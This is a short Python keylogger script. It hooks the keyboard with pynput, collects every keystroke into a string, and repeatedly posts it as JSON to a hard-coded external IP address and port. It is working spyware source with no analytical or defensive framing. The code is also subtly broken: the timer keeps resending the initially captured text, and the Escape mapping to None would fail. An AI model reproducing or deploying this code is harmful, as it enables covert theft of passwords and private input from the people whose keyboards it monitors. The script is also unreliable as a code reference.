import json
import threading
import requests
import logging
from pynput import keyboard

# Constants
IP_ADDRESS = "109.74.200.23"
PORT_NUMBER = "8080"
TIME_INTERVAL = 10

# Global variable
text = ""

# Set up logging
logging.basicConfig(filename='app.log', filemode='w', format='%(name)s - %(levelname)s - %(message)s')

def send_post_request(ip_address: str, port_number: str, text: str):
    try:
        payload = json.dumps({"keyboardData": text})
        requests.post(f"http://{ip_address}:{port_number}",
                      data=payload, headers={"Content-Type": "application/json"})
        timer = threading.Timer(TIME_INTERVAL, send_post_request, args=(ip_address, port_number, text))
        timer.start()
    except Exception as e:
        logging.error(f"Couldn't complete request! Error: {e}")

def on_press(key):
    global text

    special_keys = {
        keyboard.Key.enter: "\n",
        keyboard.Key.tab: "\t",
        keyboard.Key.space: " ",
        keyboard.Key.shift: "",
        keyboard.Key.backspace: "",
        keyboard.Key.ctrl_l: "",
        keyboard.Key.ctrl_r: "",
        keyboard.Key.esc: None
    }

    if key in special_keys:
        text += special_keys[key]
        if key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]
    else:
        text += str(key).strip("'")
    return None

with keyboard.Listener(on_press=on_press) as listener:
    send_post_request(IP_ADDRESS, PORT_NUMBER, text)
    listener.join()